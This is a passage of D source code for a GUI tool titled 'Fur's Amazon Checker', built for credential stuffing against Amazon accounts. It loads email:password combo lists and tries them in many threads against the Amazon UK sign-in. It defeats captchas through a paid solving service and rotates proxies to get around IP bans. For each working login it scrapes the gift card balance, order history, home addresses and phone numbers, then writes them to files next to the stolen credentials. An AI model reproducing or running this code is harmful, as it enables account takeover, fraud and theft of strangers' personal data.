								captchatext = runCaptcha(to!string(captchas), duser, dpass);
							}
						}
						
						auto captcha2 = match(html, regex("<img alt=\"\" src=\"(.*?)\" data-refresh-url")).captures[1];
						if (!captcha2.empty)
						{
							if (captcha2.indexOf("data:image/jpeg;base64") != -1)
							{
								captchatext = runCaptcha(to!string(captcha2).replace("data:image/jpeg;base64,", "base64:"), duser, dpass);
							}
							else if (captcha2.indexOf("https://") != -1)
							{
								captchatext = runCaptcha(to!string(get(chomp(to!string(captcha2)), conn)), duser, dpass);
							}
						}
						appActionToken = match(html, regex("appActionToken\" value=\"(.*?)\"")).captures[1];
						prevRID = match(html, regex("prevRID\" value=\"(.*?)\"")).captures[1];
						auto ces = match(html, regex("ces\" value=\"(.*?)\"")).captures[1];
						postData = "appActionToken=" ~ chomp(to!string(appActionToken)) ~ "&prevRID=" ~ chomp(to!string(prevRID)) ~ "&email=" ~ user ~ "&password=" ~ pass ~ "&ces=" ~ chomp(to!string(ces)) ~ "&guess=" ~ captchatext ~ "&forceValidateCaptcha=ape:dHJ1ZQ==&appAction=SIGNIN&create=0&accountStatusPolicy=ape:UDE=&openid.assoc_handle=ape:Z2JmbGV4&openid.claimed_id=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.identity=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjAvaWRlbnRpZmllcl9zZWxlY3Q=&openid.mode=ape:Y2hlY2tpZF9zZXR1cA==&openid.ns.pape=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvZXh0ZW5zaW9ucy9wYXBlLzEuMA==&openid.ns=ape:aHR0cDovL3NwZWNzLm9wZW5pZC5uZXQvYXV0aC8yLjA=&openid.pape.max_auth_age=ape:MA==&openid.return_to=ape:aHR0cHM6Ly93d3cuYW1hem9uLmNvLnVrL2dwL2Nzcy9vcmRlci1oaXN0b3J5P2llPVVURjgmcmVmXz1uYXZfZ25vX3lhbV95cmRycw==&pageId=ape:d2ViY3MteW91cm9yZGVy&showRmrMe=ape:MQ==";
						html = post("https://www.amazon.co.uk/ap/signin", postData.replace(":", "%3A"), conn);
						if (html.indexOf("Enter the characters as they are shown in the image.") != -1 || html.indexOf("To better protect your account") != -1)
						{
							writeln("Account Still Has Captcha! " ~ user);
							captcha = true;
						}
						else if (html.indexOf("There was an error with your E-Mail/Password combination") != -1)
						{
							writeln("Account Does Not Work! " ~ user);
							std.file.append("./UK Non-Working.txt", user ~ ":" ~ pass ~ "\r\n");
							return;
						}
						else if (html.indexOf("Server Busy") != -1)
						{
							writeln("BANNED! CHANGE YOUR IP TO FIX IT");
							return;
						}
						else if (html.indexOf("<title>Your Orders</title>") != -1)
						{
							writeln("Account Works! " ~ user);
							captcha = false;
							working = true;
						}
					}
				}
				else 
				{
					writeln("Captcha Found and no DBC! Can't Check!");
					return;
				}
			}
			else if (html.indexOf("There was an error with your E-Mail/Password combination") != -1)
			{
				writeln("Account Does Not Work! " ~ user);
				std.file.append("./UK Non-Working.txt", user ~ ":" ~ pass ~ "\r\n");
				return;
			}
			else if (html.indexOf("Server Busy") != -1)
			{
				writeln("BANNED! CHANGE YOUR IP TO FIX IT");
				return;
			}
			else if (html.indexOf("<title>Your Orders</title>") != -1)
			{
				writeln("Account Works! " ~ user);
				working = true;
			}
			
			if (working)
			{
				html = get("https://www.amazon.co.uk/gp/css/gc/balance?ie=UTF8&ref_=ya_view_gc&", conn);
				auto gcbre = regex("Balance:.*?<span>(.*?)</span>", "s");
				auto gcbm = match(html, gcbre);
				gcb = to!string(gcbm.captures[1]);
				
				int years = 2014;
				int yearsend = 2015;
				while (years <= yearsend)
				{
					bool pages = true;
					int page = 1;
					
					while (pages)
					{
						string purl = "https://www.amazon.co.uk/gp/css/order-history?opt=ab&digitalOrders=1&unifiedOrders=1&returnTo=&orderFilter=year-" ~ to!string(years) ~ "&startIndex=" ~ to!string((page - 1) * 10);
						html = get(purl, conn);
						auto orderre = regex("<a class=\"a-link-normal\" href=\"/gp/product/.*?\">(.*?)</a>", "s");
						auto matches = matchAll(html, orderre);
						if (matches.empty)
						{
							pages = false;
						}
						foreach (c; matches)
						{
							if (c.hit.indexOf("<img") == -1)
							{
								auto ordersre = regex("        (.*?)\n", "s");
								auto ordersm = match(c.hit, ordersre);
								auto ordersa = ordersm.captures[1];
								orders ~= chomp(ordersa);
							}
						}
						page += 1;
					}
					years += 1;
				}
				html = get("https://www.amazon.co.uk/gp/css/account/address/view.html?ie=UTF8&ref_=ya_manage_address_book_t1", conn);
				
				auto addressre = regex("displayAddressLI displayAddressAddressLine1\">(.*?)</li>", "s");
				auto addressm = matchAll(html, addressre);
				string[] addresses;
				foreach (c; addressm)
				{
					auto itemre = regex(">(.*?)<", "s");
					auto itemm = match(c.hit, itemre);
					auto item = itemm.captures[1];
					addresses ~= chomp(to!string(item));
				}
				
				auto cityre = regex("displayAddressLI displayAddressCityStateOrRegionPostalCode\">(.*?)</li>", "s");
				auto citym = matchAll(html, cityre);
				string[] citys;
				foreach (c; citym)
				{
					auto itemre = regex(">(.*?)<", "s");
					auto itemm = match(c.hit, itemre);
					auto item = itemm.captures[1];
					citys ~= chomp(to!string(item));
				}
				
				auto countryre = regex("displayAddressLI displayAddressCountryName\">(.*?)</li>", "s");
				auto countrym = matchAll(html, countryre);
				string[] countrys;
				foreach (c; countrym)
				{
					auto itemre = regex(">(.*?)<", "s");
					auto itemm = match(c.hit, itemre);
					auto item = itemm.captures[1];
					countrys ~= chomp(to!string(item));
				}
				
				auto phonere = regex("displayAddressLI displayAddressPhoneNumber\">(.*?)</li>", "s");
				auto phonem = matchAll(html, phonere);
				string[] phones;
				foreach (c; phonem)
				{
					auto itemre = regex(">(.*?)<", "s");
					auto itemm = match(c.hit, itemre);
					auto item = itemm.captures[1];
					phones ~= chomp(to!string(item));
				}
				
				if (save == 0) {
					if (orders.length > 0)
					{
						string content = "====================================\r\nAccount: " ~ user ~ ":" ~ pass ~ "\r\n";
						content ~= "Gift Card Balance: " ~ gcb ~ "\r\n";
						
						content ~= "Addresses: \r\n";
						foreach (address; addresses)
						{
							content ~= ("    " ~ address ~ "\r\n");
						}
						
						content ~= "City, State ZIP: \r\n";
						foreach (city; citys)
						{
							content ~= ("    " ~ city ~ "\r\n");
						}
						
						content ~= "Country: \r\n";
						foreach (country; countrys)
						{
							content ~= ("    " ~ country ~ "\r\n");
						}
						
						content ~= "Phone: \r\n";
						foreach (phone; phones)
						{
							content ~= ("    " ~ phone ~ "\r\n");
						}
						
						content ~= "Orders: \r\n";
						foreach (order; orders)
						{
							content ~= ("    " ~ order ~ "\r\n");
						}
						content ~= "====================================\r\n\r\n";
						writeln("Account has " ~ to!string(orders.length) ~ " orders and " ~ gcb ~ " Gift Card Balance");
						std.file.append("./UK Working.txt", content);
					}
					else if (gcb != "$0.00" || !gcb.empty)
					{
						writeln("Account has " ~ to!string(orders.length) ~ " orders and " ~ gcb ~ " Gift Card Balance");
					}
					else
					{
						writeln("Account has No Orders or Gift Card Balance, not saving!");
					}
					return;
				} else if (save == 1) {
					if (orders.length > 0)
					{
						string content = "Account: " ~ user ~ ":" ~ pass ~ "\r\n";
						content ~= "Gift Card Balance: " ~ gcb ~ "\r\n";
						
						content ~= "Addresses: \r\n";
						foreach (address; addresses)
						{
							content ~= ("    " ~ address ~ "\r\n");
						}
						
						content ~= "City, State ZIP: \r\n";
						foreach (city; citys)
						{
							content ~= ("    " ~ city ~ "\r\n");
						}
						
						content ~= "Country: \r\n";
						foreach (country; countrys)
						{
							content ~= ("    " ~ country ~ "\r\n");
						}
						
						content ~= "Phone: \r\n";
						foreach (phone; phones)
						{
							content ~= ("    " ~ phone ~ "\r\n");
						}
						
						content ~= "Orders: \r\n";
						foreach (order; orders)
						{
							content ~= ("    " ~ order ~ "\r\n");
						}
						
						writeln("Account has " ~ to!string(orders.length) ~ " orders and " ~ gcb ~ " Gift Card Balance");
						std.file.write("./accountsUK/" ~ user ~ ".txt", content);
					}
					else if (gcb.indexOf("0.00") != -1)
					{
						writeln("Account has " ~ to!string(orders.length) ~ " orders and " ~ gcb ~ " Gift Card Balance");
					}
					else
					{
						writeln("Account has No Orders or Gift Card Balance, not saving!");
					}
					return;
				}
				done = true;
			}
			delete html;
			conn.clearAllCookies();
		} catch (Exception e) {
			writeln(e.msg);
			core.thread.Thread.sleep(dur!("seconds")(1));
		}
		trys += 1;
	}
}

void startUK(string combofile, bool saveMulti, int threads, string duser = null, string dpass = null)
{
	auto accounts = readText(combofile).splitLines();
	auto work = new TaskPool(threads);
	foreach (account; work.parallel(accounts))
	{
		if(account.indexOf(":") != -1 && account.indexOf("@") != -1)
		{
			auto arr = split(account, ":");
			if (saveMulti) {
				runUK(to!string(chomp(arr[0])), to!string(chomp(arr[1])), 1, duser, dpass);
			} else {
				runUK(to!string(chomp(arr[0])), to!string(chomp(arr[1])), 0, duser, dpass);
			}
		}
	}
}

class mWindow : MainWindow
{
	Label StatusLbl;
	string file;
	bool saveMulti = false;
	SpinButton spinb;
	this()
	{
		super("Fur's Amazon Checker and Checker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("Reg. Email Check", &regcheck));
		box.add(new Button("Proxy Checker", &proxycheck));
		box.add(new Button("Crack", &crack));
		box.add(new Button("Check US Accounts", &check));
		box.add(new Button("Check UK Accounts", &checkUK));
		add(box);
		showAll();	
	}
	
	void crack(Button button)
	{
		auto amazon = new AmazonCrack();
		this.destroy();
	}
	
	void regcheck(Button button)
	{
		auto amazon = new AmazonReg();
		this.destroy();
	}
	
	void proxycheck(Button button)
	{
		auto amazon = new AmazonProxy();
		this.destroy();
	}
	
	void check(Button button)
	{
		auto amazon = new Amazon();
		this.destroy();
	}
	
	void checkUK(Button button)
	{
		auto amazon = new AmazonUK();
		this.destroy();
	}
}

class Amazon : MainWindow
{
	Label StatusLbl;
	string combofile;
	bool saveMulti = false;
	SpinButton spinb;
	Entry user;
	Entry pass;
	this()
	{
		super("Fur's Amazon Checker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("Load Combos", &loadCombos));
		box.add(new Label("Threads"));
		spinb = new SpinButton(1, 15, 1);
		box.add(spinb);
		box.add(new Label("DBC User (If using DBC)"));
		user = new Entry();
		box.add(user);
		box.add(new Label("DBC Password (If using DBC)"));
		pass = new Entry();
		box.add(pass);
		box.add(new Button("Start", &start));
		box.add(new Button("Go Back", &back));
		add(box);
		showAll();	
	}
	
	void loadCombos(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			combofile = dlg.getFilename();
		}
		dlg.destroy();
	}
	void start(Button button)
	{
		if (user.getText().empty) {
			startRun(combofile, to!int(spinb.getText));
		} else {
			startRun(combofile, to!int(spinb.getText), user.getText(), pass.getText());
		}
		writeln("Done Checking!");
	}
	
	void back(Button button)
	{
		auto amazon = new mWindow();
		this.destroy();
	}
}

class AmazonCrack : MainWindow
{
	Label StatusLbl;
	string combofile;
	string proxyfile;
	SpinButton spinb;
	Entry user;
	Entry pass;
	this()
	{
		super("Fur's Amazon Cracker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("Load Combos", &loadCombos));
		box.add(new Button("Load Proxies", &loadProxies));
		box.add(new Label("DBC User (If using DBC)"));
		user = new Entry();
		box.add(user);
		box.add(new Label("DBC Password (If using DBC)"));
		pass = new Entry();
		box.add(pass);
		box.add(new Label("Threads"));
		spinb = new SpinButton(100, 350, 1);
		box.add(spinb);
		box.add(new Button("Start", &start));
		box.add(new Button("Go Back", &back));
		add(box);
		showAll();	
	}
	
	void loadCombos(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			combofile = dlg.getFilename();
		}
		dlg.destroy();
	}
	
	void loadProxies(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			proxyfile = dlg.getFilename();
		}
		dlg.destroy();
	}
	
	void start(Button button)
	{
		if (user.getText().empty) {
			startCrack(combofile, proxyfile, to!int(spinb.getText));
		} else {
			startCrack(combofile, proxyfile, to!int(spinb.getText), user.getText(), pass.getText());
		}
	}
	
	void back(Button button)
	{
		auto amazon = new mWindow();
		this.destroy();
	}
}

class AmazonReg : MainWindow
{
	Label StatusLbl;
	string combofile;
	SpinButton spinb;
	this()
	{
		super("Fur's Amazon Registered Checker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("Load Combos", &loadCombos));
		box.add(new Label("Threads"));
		spinb = new SpinButton(200, 350, 1);
		box.add(spinb);
		box.add(new Button("Start", &start));
		box.add(new Button("Go Back", &back));
		add(box);
		showAll();	
	}
	
	void loadCombos(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			combofile = dlg.getFilename();
		}
		dlg.destroy();
	}
	
	void start(Button button)
	{
		startReg(combofile, to!int(spinb.getText));
		writeln("Done Checking!");
	}
	
	void back(Button button)
	{
		auto amazon = new mWindow();
		this.destroy();
	}
}

class AmazonProxy : MainWindow
{
	Label StatusLbl;
	string proxyfile;
	SpinButton spinb;
	this()
	{
		super("Fur's Proxy Checker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("Load Proxies", &loadCombos));
		box.add(new Label("Threads"));
		spinb = new SpinButton(200, 350, 1);
		box.add(spinb);
		box.add(new Button("Start", &start));
		box.add(new Button("Go Back", &back));
		add(box);
		showAll();	
	}
	
	void loadCombos(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			proxyfile = dlg.getFilename();
		}
		dlg.destroy();
	}
	
	void start(Button button)
	{
		startProxy(proxyfile, to!int(spinb.getText));
		writeln("Done Checking!");
	}
	
	void back(Button button)
	{
		auto amazon = new mWindow();
		this.destroy();
	}
}

class AmazonUK : MainWindow
{
	Label StatusLbl;
	string combofile;
	bool saveMulti = false;
	SpinButton spinb;
	Entry user;
	Entry pass;
	this()
	{
		super("Fur's UK Amazon Checker");
		setDefaultSize(250, 250);
		VBox box = new VBox(false, 2);
		box.add(new Button("Load Combos", &loadCombos));
		box.add(new Button("Set Save to One File", &saveOne));
		box.add(new Button("Set Save to Multiple Files", &saveMult));
		box.add(new Label("DBC User (If using DBC)"));
		user = new Entry();
		box.add(user);
		box.add(new Label("DBC Password (If using DBC)"));
		pass = new Entry();
		box.add(pass);
		box.add(new Label("Threads"));
		spinb = new SpinButton(1, 15, 1);
		box.add(spinb);
		box.add(new Button("Start", &start));
		box.add(new Button("Go Back", &back));
		add(box);
		showAll();	
	}
	
	void loadCombos(Button button)
	{
		auto dlg = new FileChooserDialog(
			"Open File",
			this,
			FileChooserAction.OPEN,
			["Open", "Cancel"],
			[ResponseType.ACCEPT, ResponseType.CANCEL]
			);
		if (GtkResponseType.ACCEPT == dlg.run()){
			combofile = dlg.getFilename();
		}
		dlg.destroy();
	}
	
	void saveOne(Button button)
	{
		saveMulti = false;
	}
	
	void saveMult(Button button)
	{
		saveMulti = true;
	}
	
	void start(Button button)
	{
		
		if (user.getText().empty) {
			startUK(combofile, saveMulti, to!int(spinb.getText));
		} else {
			startUK(combofile, saveMulti, to!int(spinb.getText), user.getText(), pass.getText());
		}
	}
	
	void back(Button button)
	{
		auto amazon = new mWindow();
		this.destroy();
	}
}

void main(string[] args)
{
	Main.init(args);
	auto mwin = new mWindow();
	Main.run();
}